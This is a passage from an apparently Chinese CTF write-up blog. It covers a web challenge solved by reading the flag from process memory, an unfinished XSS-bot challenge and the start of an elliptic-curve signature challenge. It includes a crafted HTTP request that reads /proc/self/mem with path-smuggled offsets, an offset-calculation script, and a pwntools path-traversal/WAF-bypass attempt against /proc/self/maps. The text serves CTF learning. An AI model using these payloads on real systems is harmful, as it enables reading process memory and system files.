class="line">7fa2fea94000-7fa2fea9b000 r--p 00017000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fa2fea9b000-7fa2fea9c000 r--p 0001d000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fa2fea9c000-7fa2fea9d000 rw-p 0001e000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fa2fea9d000-7fa2feb94000 r--p 00000000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fa2feb94000-7fa2fef15000 r-xp 000f7000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fa2fef15000-7fa2ff04c000 r--p 00478000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fa2ff04c000-7fa2ff0cf000 r--p 005ae000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fa2ff0cf000-7fa2ff0d2000 rw-p 00631000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.3</span><br><span class="line">7fa2ff0d2000-7fa2ff0d5000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ff0d5000-7fa2ff0d9000 r--p 00000000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0d9000-7fa2ff0df000 r-xp 00004000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0df000-7fa2ff0e3000 r--p 0000a000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0e3000-7fa2ff0e4000 r--p 0000d000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0e4000-7fa2ff0e6000 rw-p 0000e000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0e6000-7fa2ff0ea000 r--p 00000000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0ea000-7fa2ff0f1000 r-xp 00004000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0f1000-7fa2ff0f5000 r--p 0000b000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0f5000-7fa2ff0f6000 r--p 0000f000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0f6000-7fa2ff0f7000 rw-p 00010000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff0f7000-7fa2ff1f7000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ff1f7000-7fa2ff1f9000 r--p 00000000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff1f9000-7fa2ff1fc000 r-xp 00002000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff1fc000-7fa2ff1fe000 r--p 00005000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff1fe000-7fa2ff1ff000 r--p 00006000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff1ff000-7fa2ff200000 rw-p 00007000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff200000-7fa2ff300000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ff300000-7fa2ff304000 r--p 00000000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff304000-7fa2ff30f000 r-xp 00004000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff30f000-7fa2ff318000 r--p 0000f000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff318000-7fa2ff319000 r--p 00017000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff319000-7fa2ff31a000 rw-p 00018000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ff31a000-7fa2ff51a000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ff51a000-7fa2ff52b000 r--p 00000000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fa2ff52b000-7fa2ff5a8000 r-xp 00011000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fa2ff5a8000-7fa2ff608000 r--p 0008e000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fa2ff608000-7fa2ff609000 r--p 000ed000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fa2ff609000-7fa2ff60a000 rw-p 000ee000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.6</span><br><span class="line">7fa2ff60a000-7fa2ff632000 r--p 00000000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fa2ff632000-7fa2ff797000 r-xp 00028000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fa2ff797000-7fa2ff7ed000 r--p 0018d000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fa2ff7ed000-7fa2ff7f1000 r--p 001e2000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fa2ff7f1000-7fa2ff7f3000 rw-p 001e6000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7fa2ff7f3000-7fa2ff800000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ff800000-7fa2ff900000 r--p 00000000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.0</span><br><span class="line">7fa2ff900000-7fa2ffb1f000 r-xp 00100000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.0</span><br><span class="line">7fa2ffb1f000-7fa2ffc6f000 r--p 0031f000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.0</span><br><span class="line">7fa2ffc6f000-7fa2ffce6000 r--p 0046e000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.0</span><br><span class="line">7fa2ffce6000-7fa2ffe55000 rw-p 004e5000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.0</span><br><span class="line">7fa2ffe55000-7fa2ffe56000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ffe5c000-7fa2ffe5f000 r--p 00000000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ffe5f000-7fa2ffe67000 r-xp 00003000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ffe67000-7fa2ffe6c000 r--p 0000b000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ffe6c000-7fa2ffe6d000 r--p 0000f000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ffe6d000-7fa2ffe6e000 rw-p 00010000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2ffe6e000-7fa2ffed4000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2ffed4000-7fa2ffedb000 r--s 00000000 103:00 15520059                  /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span><br><span class="line">7fa2ffedb000-7fa2fff35000 r--p 00000000 103:00 15519696                  /usr/lib/locale/C.utf8/LC_CTYPE</span><br><span class="line">7fa2fff35000-7fa2fff37000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2fff38000-7fa2fff39000 rw-s 00000000 00:01 6174                       /dev/zero (deleted)</span><br><span class="line">7fa2fff39000-7fa2fff3b000 rw-p 00000000 00:00 0 </span><br><span class="line">7fa2fff3b000-7fa2fff3c000 r--p 00000000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fa2fff3c000-7fa2fff64000 r-xp 00001000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fa2fff64000-7fa2fff6f000 r--p 00029000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fa2fff6f000-7fa2fff71000 r--p 00034000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fa2fff71000-7fa2fff72000 rw-p 00036000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fa2fff72000-7fa2fff73000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffe68e9d000-7ffe68ebe000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffe68ec9000-7ffe68ecd000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffe68ecd000-7ffe68ecf000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure><p><strong>/dev/zero</strong>是<code>Linux</code>的<code>零字节设备</code>，本身不存储任何数据，但通过<strong>mmap映射</strong>它时，会生成一块<strong>初始值为 0、支持读写</strong>的内存区域</p><p>由于<code>/dev/zero</code>映射区的特性（初始为 0、支持共享、无需关联真实文件数据），进程会通过<code>mmap(&quot;/dev/zero&quot;, ...)</code>创建这块内存，再将<code>flag</code>主动写入到这个映射区（覆盖初始的 0 值）</p><p><code>7fa2fff38000</code>转换为十进制数</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /.?offset=140338055577600&amp;length=100000.?offset=0&amp;length=10000/pr?offset=0&amp;length=100000oc/self/mem HTTP/1.1</span><br><span class="line">Host: 60.205.163.215:17309</span><br></pre></td></tr></table></figure><p>这里也偷一个计算偏移和长度的脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">maps = <span class="built_in">open</span>(<span class="string">&quot;maps.txt&quot;</span>)</span><br><span class="line">b = maps.read()</span><br><span class="line"><span class="built_in">list</span> = b.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;rw&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">        addr = re.search(<span class="string">&#x27;([0-9a-f]+)-([0-9a-f]+)&#x27;</span>, line)</span><br><span class="line">        <span class="comment"># 正则匹配地址,地址格式为十六进制数[0-9a-f],reserch会返回一个re.Match对象，用括号括起来是为了使用group()处理返回结果。</span></span><br><span class="line">        start = <span class="built_in">int</span>(addr.group(<span class="number">1</span>), <span class="number">16</span>)  <span class="comment"># 将十六进制字符转化为十进制数，为了符合start参数格式参考链接</span></span><br><span class="line">        end = <span class="built_in">int</span>(addr.group(<span class="number">2</span>), <span class="number">16</span>)  <span class="comment"># 将十六进制字符转化为十进制数，为了符合end参数格式</span></span><br><span class="line">        <span class="built_in">print</span>(start, end)</span><br><span class="line">        <span class="built_in">print</span>(end-start)</span><br></pre></td></tr></table></figure><p>好一个<strong>代码审计</strong>，这里只是<strong>非预期</strong>(?)，预期解应该是打<code>log</code>(?)</p><h3 id="预期"><a href="#预期" class="headerlink" title="预期(?)"></a>预期(?)</h3><p>本题的接收代码函数只出现了两次，但<code>initial_data = conn.recv(256, socket.MSG_PEEK)</code>，此处多了参数<code>MSG_PEEK</code></p><blockquote><p>MSG_PEEK: 表示只是从缓冲区读取内容而不清除缓冲区，也就是说下次读取还是相同的内容，多进程需要读取相同数据的时候可以使用</p></blockquote><p>所以它的作用是，用来<strong>预处理</strong>，看接收的信息是否含有<strong>禁止的关键字</strong>以及是否<strong>开启log模式</strong></p><p>真正的读出并清除缓冲区是在<code>handle_connection</code>，此处还有一个接收<code>request_data = conn.recv(256)</code></p><blockquote><p>在读入前，如果开了log模式，会优先进行log再读入，我们可以传入一个较大的factor，然后在这段时间里发送不能被waf接受的数据，而路径中被污染的/?log=1&amp;factor=100000则在后续数据用../覆盖</p></blockquote><p>只发送一遍，会得到<code>500</code>的响应，而且修改<code>factor</code>的值会出现<strong>没有反应</strong>的问题</p><p>两个都发送的话，会直接返回<code>403</code><br>所以我也不知道本地是否可行了，但感觉<code>peek</code>确实是预期解，再蹲一下其他人或者出题人的<code>wp</code>？</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">remote1 = remote(host, port)</span><br><span class="line"></span><br><span class="line">remote1.send(<span class="string">b&#x27;GET /?log=1&amp;factor=100000&#x27;</span>)</span><br><span class="line">remote1.send(<span class="string">f&#x27;/../../../proc/self/maps&#x27;</span>.encode())</span><br><span class="line">resp = remote1.recv()</span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure><p>可惜的是，本地验证失败了<br>这里记录一下本地起<code>docker</code>的流程</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先把这个大包pull下来，直接构建大概率会失败</span></span><br><span class="line">docker pull python:3.12-slim</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建</span></span><br><span class="line">docker build -t peek .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 做端口映射</span></span><br><span class="line">docker run -d -p 1337:1337 --name web peek</span><br></pre></td></tr></table></figure><h2 id="Unfinished-待学习"><a href="#Unfinished-待学习" class="headerlink" title="Unfinished(待学习)"></a>Unfinished(待学习)</h2><blockquote><p>程序好像有点Bug，别急，明年就修复了（</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, flash, render_template_string, make_response</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> LoginManager, UserMixin, login_user, logout_user, current_user, login_required</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> markupsafe <span class="keyword">import</span> escape</span><br><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;your-secret-key-here&#x27;</span></span><br><span class="line"></span><br><span class="line">login_manager = LoginManager()</span><br><span class="line">login_manager.init_app(app)</span><br><span class="line">login_manager.login_view = <span class="string">&#x27;login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">UserMixin</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, <span class="built_in">id</span>, username, password, bio=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        self.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line">        self.bio = bio</span><br><span class="line">admin_password = os.urandom(<span class="number">12</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">USERS_DB = &#123;<span class="string">&#x27;admin&#x27;</span>: User(<span class="built_in">id</span>=<span class="number">1</span>, username=<span class="string">&#x27;admin&#x27;</span>, password=admin_password)&#125;</span><br><span class="line">USER_ID_COUNTER = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_manager.user_loader</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_user</span>(<span class="params">user_id</span>):</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> USERS_DB.values():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(user.<span class="built_in">id</span>) == user_id:</span><br><span class="line">            <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">global</span> USER_ID_COUNTER</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> USERS_DB:</span><br><span class="line">            flash(<span class="string">&#x27;Username already exists.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        USER_ID_COUNTER += <span class="number">1</span></span><br><span class="line">        new_user = User(</span><br><span class="line">            <span class="built_in">id</span>=USER_ID_COUNTER,</span><br><span class="line">            username=username,</span><br><span class="line">            password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        )</span><br><span class="line">        USERS_DB[username] = new_user</span><br><span class="line">        login_user(new_user)</span><br><span class="line">        response = make_response(redirect(url_for(<span class="string">&#x27;index&#x27;</span>)))</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;ticket&#x27;</span>, <span class="string">&#x27;your_ticket_value&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        user = USERS_DB.get(username)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user.password == password:</span><br><span class="line">            login_user(user)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        flash(<span class="string">&#x27;Invalid credentials.&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        current_user.bio = request.form[<span class="string">&#x27;bio&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(current_user.bio)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;profile.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ticket&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ticket</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        ticket = request.form[<span class="string">&#x27;ticket&#x27;</span>]</span><br><span class="line">        response = make_response(redirect(url_for(<span class="string">&#x27;index&#x27;</span>)))</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;ticket&#x27;</span>, ticket)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;ticket.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_user</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # I found a bug in it.</span></span><br><span class="line"><span class="string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    username = request.args.get(<span class="string">&quot;username&quot;</span>,default=current_user.username)</span><br><span class="line">    visit_url(<span class="string">f&quot;http://localhost/api/bio/<span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;</span></span><br><span class="line"><span class="string">    &#123;&#123;% block title %&#125;&#125;success&#123;&#123;% endblock %&#125;&#125;</span></span><br><span class="line"><span class="string">    &#123;&#123;% block content %&#125;&#125;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;bot will visit your bio&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;p style=&quot;margin-top: 1.5rem;&quot;&gt;&lt;a href=&quot;&#123;&#123;&#123;&#123; url_for(&#x27;index&#x27;) &#125;&#125;&#125;&#125;&quot;&gt;Back to Home&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &#123;&#123;% endblock %&#125;&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/bio/&lt;string:username&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_bio</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.username == username:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">401</span></span><br><span class="line">    user = USERS_DB.get(username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User not found.&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> user.bio</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_value = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;fake&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">            browser = p.chromium.launch(headless=<span class="literal">True</span>, args=[<span class="string">&quot;--no-sandbox&quot;</span>])</span><br><span class="line">            context = browser.new_context()</span><br><span class="line"></span><br><span class="line">            context.add_cookies([&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">                <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span></span><br><span class="line">            &#125;])</span><br><span class="line"></span><br><span class="line">            page = context.new_page()</span><br><span class="line">            page.goto(<span class="string">&quot;http://localhost/login&quot;</span>, timeout=<span class="number">5000</span>)</span><br><span class="line">            page.fill(<span class="string">&quot;input[name=&#x27;username&#x27;]&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">            page.fill(<span class="string">&quot;input[name=&#x27;password&#x27;]&quot;</span>, admin_password)</span><br><span class="line">            page.click(<span class="string">&quot;input[name=&#x27;submit&#x27;]&quot;</span>)</span><br><span class="line">            page.wait_for_timeout(<span class="number">3000</span>)</span><br><span class="line">            page.goto(url, timeout=<span class="number">5000</span>)</span><br><span class="line">            page.wait_for_timeout(<span class="number">5000</span>)</span><br><span class="line">            browser.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Bot error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="sign-in-the-ca7s-补"><a href="#sign-in-the-ca7s-补" class="headerlink" title="sign in the ca7s(补)"></a>sign in the ca7s(补)</h2><blockquote><p>Sign in the cats, so that you can cat the flag! 🐱<br>Note: This is the easy version of “sign the ca7s”.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;**redacted**&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(<span class="number">0x1337_ca7_eae368ff5d702e6067aaaa77ca_ca7_1337</span>), [<span class="number">0</span>, <span class="number">3</span>])</span><br><span class="line">G, n = E(<span class="number">1</span>, <span class="number">2</span>), E.order()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">priv, ctx, msg</span>):</span><br><span class="line">    k = bytes_to_long(ctx + md5(<span class="built_in">str</span>(priv).encode() + msg).digest())</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r = <span class="built_in">int</span>((k * G).x()) % n</span><br><span class="line">    s = (<span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * priv)) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">pub, ctx, msg, sig</span>):</span><br><span class="line">    z = bytes_to_long(md5(ctx + msg).digest())</span><br><span class="line">    r, s = sig</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt; r &lt; n <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; n:</span><br><span class="line">        <span class="keyword">return</span> r == <span class="built_in">int</span>((<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) * (z * G + r * pub)).x()) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>(<span class="params">level, flag</span>):</span><br><span class="line">    priv = randint(<span class="number">1</span>, n - 